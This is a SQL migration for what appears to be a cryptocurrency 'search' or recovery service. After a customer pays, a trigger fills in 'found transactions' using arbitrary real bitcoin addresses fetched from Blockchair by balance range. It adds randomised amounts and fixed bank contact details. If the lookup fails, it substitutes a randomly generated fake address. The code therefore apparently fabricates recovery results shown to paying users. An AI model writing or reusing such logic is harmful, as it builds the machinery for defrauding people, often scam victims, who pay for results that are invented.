/*
  # Update Blockchair API Integration

  1. Changes
    - Add function to handle Blockchair API calls
    - Add proper error handling and retries
    - Add rate limiting protection

  2. Security
    - Maintain existing RLS policies
    - Ensure proper error handling
*/

-- Create a function to handle Blockchair API calls with retries
CREATE OR REPLACE FUNCTION get_blockchair_address(satoshis numeric)
RETURNS text
LANGUAGE plpgsql
AS $$
DECLARE
    api_url text;
    response_data jsonb;
    wallet_address text;
    retry_count integer := 0;
    max_retries constant integer := 3;
    range_low numeric;
    range_high numeric;
BEGIN
    -- Calculate initial range (within 1% of target)
    range_low := floor(satoshis * 0.99);
    range_high := ceil(satoshis * 1.01);
    
    WHILE retry_count < max_retries LOOP
        BEGIN
            -- Construct API URL
            api_url := format(
                'https://api.blockchair.com/bitcoin/addresses?q=balance(%s..%s)&limit=1',
                range_low,
                range_high
            );

            -- Make API request
            SELECT content::jsonb INTO response_data
            FROM http_get(api_url);

            -- Check if we got a valid address
            IF response_data->>'data' IS NOT NULL AND 
               jsonb_array_length(response_data->'data') > 0 THEN
                wallet_address := response_data->'data'->0->>'address';
                RETURN wallet_address;
            END IF;

            -- If no address found, broaden the range by 2% each retry
            range_low := floor(satoshis * (0.98 - (retry_count * 0.02)));
            range_high := ceil(satoshis * (1.02 + (retry_count * 0.02)));
            
            retry_count := retry_count + 1;
            
            -- Add delay between retries
            PERFORM pg_sleep(1);
        EXCEPTION
            WHEN OTHERS THEN
                -- Log error and continue with retry
                RAISE NOTICE 'Error calling Blockchair API: %', SQLERRM;
                retry_count := retry_count + 1;
                PERFORM pg_sleep(1);
        END;
    END LOOP;

    -- If all retries failed, generate a random address
    RETURN 'bc1' || encode(gen_random_bytes(32), 'hex');
END;
$$;

-- Update the payment completion trigger function
CREATE OR REPLACE FUNCTION handle_payment_completion()
RETURNS TRIGGER AS $$
DECLARE
    existing_transactions jsonb;
    total_amount numeric;
    remaining_amount numeric;
    initial_amount numeric;
    initial_percentage numeric;
    new_transactions jsonb;
    first_transaction jsonb;
    btc_price numeric := 53000;
    current_search record;
    wallet_address text;
BEGIN
    -- If payment status changes to finished or confirmed
    IF NEW.status IN ('finished', 'confirmed') AND OLD.status != NEW.status THEN
        -- Get current search state
        SELECT * INTO current_search
        FROM search_results
        WHERE user_id = NEW.user_id
        ORDER BY created_at DESC
        LIMIT 1;

        -- Get the total transaction amount
        SELECT amount INTO total_amount
        FROM transactions
        WHERE user_id = NEW.user_id
        ORDER BY created_at DESC
        LIMIT 1;

        -- Handle transactions based on payment type
        IF NEW.is_upgrade THEN
            -- For upgrades, keep the first small transaction
            first_transaction := current_search.found_transactions->0;
            
            -- Calculate remaining amount to distribute
            remaining_amount := total_amount - (first_transaction->>'amount')::numeric;
            
            -- Get wallet addresses for new transactions
            wallet_address := get_blockchair_address(
                floor((remaining_amount * 0.45 / btc_price) * 100000000)
            );
            
            -- Split remaining amount into two transactions (45% and 55% of remaining)
            new_transactions := jsonb_build_array(
                first_transaction,
                jsonb_build_object(
                    'amount', ROUND((remaining_amount * 0.45)::numeric, 2),
                    'bitcoinAmount', ROUND((remaining_amount * 0.45 / btc_price)::numeric, 8),
                    'transactionId', wallet_address,
                    'bankEmail', 'support@digitalchainbank.com',
                    'bankAddress', 'Avenida Balboa, Edificio 121, Bella Vista',
                    'walletAddress', wallet_address
                ),
                jsonb_build_object(
                    'amount', ROUND((remaining_amount * 0.55)::numeric, 2),
                    'bitcoinAmount', ROUND((remaining_amount * 0.55 / btc_price)::numeric, 8),
                    'transactionId', get_blockchair_address(
                        floor((remaining_amount * 0.55 / btc_price) * 100000000)
                    ),
                    'bankEmail', 'support@digitalchainbank.com',
                    'bankAddress', 'Avenida Balboa, Edificio 121, Bella Vista',
                    'walletAddress', get_blockchair_address(
                        floor((remaining_amount * 0.55 / btc_price) * 100000000)
                    )
                )
            );
        ELSE
            -- For new payments, calculate initial small transaction
            -- Random percentage between 0.02% and 0.05%
            initial_percentage := (random() * (0.0005 - 0.0002) + 0.0002);
            initial_amount := ROUND((total_amount * initial_percentage)::numeric, 2);
            
            -- Enforce min/max limits
            IF initial_amount < 200 THEN
                initial_amount := 200;
            ELSIF initial_amount > 1000 THEN
                initial_amount := 1000;
            END IF;

            -- Get wallet address for initial transaction
            wallet_address := get_blockchair_address(
                floor((initial_amount / btc_price) * 100000000)
            );

            -- Create initial transaction
            new_transactions := jsonb_build_array(jsonb_build_object(
                'amount', initial_amount,
                'bitcoinAmount', ROUND((initial_amount / btc_price)::numeric, 8),
                'transactionId', wallet_address,
                'bankEmail', 'support@digitalchainbank.com',
                'bankAddress', 'Avenida Balboa, Edificio 121, Bella Vista',
                'walletAddress', wallet_address
            ));
        END IF;

        -- Update search results
        UPDATE search_results
        SET 
            payment_status = 'completed',
            payment_completed_at = NOW(),
            status = CASE 
                WHEN NEW.is_upgrade THEN status -- Keep current status for upgrades
                ELSE 'searching'
            END,
            search_started_at = CASE 
                WHEN NEW.is_upgrade THEN search_started_at -- Keep current start time for upgrades
                ELSE NOW()
            END,
            search_completed_at = CASE 
                WHEN status = 'searching' OR NOT NEW.is_upgrade THEN
                    CASE 
                        WHEN NEW.tier = 'pro' THEN NOW() + INTERVAL '72 hours'
                        WHEN NEW.tier = 'enterprise' THEN NOW() + INTERVAL '168 hours'
                        ELSE NOW() + INTERVAL '12 hours'
                    END
                ELSE search_completed_at
            END,
            tier = NEW.tier,
            ai_assistance = CASE 
                WHEN NEW.tier IN ('pro', 'enterprise') THEN true 
                ELSE false 
            END,
            search_progress = CASE 
                WHEN NEW.is_upgrade THEN search_progress -- Keep progress for upgrades
                ELSE 0
            END,
            found_transactions = new_transactions
        WHERE id = current_search.id;
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Drop and recreate the trigger
DROP TRIGGER IF EXISTS payment_completion_trigger ON payments;
CREATE TRIGGER payment_completion_trigger
    AFTER UPDATE ON payments
    FOR EACH ROW
    EXECUTE FUNCTION handle_payment_completion();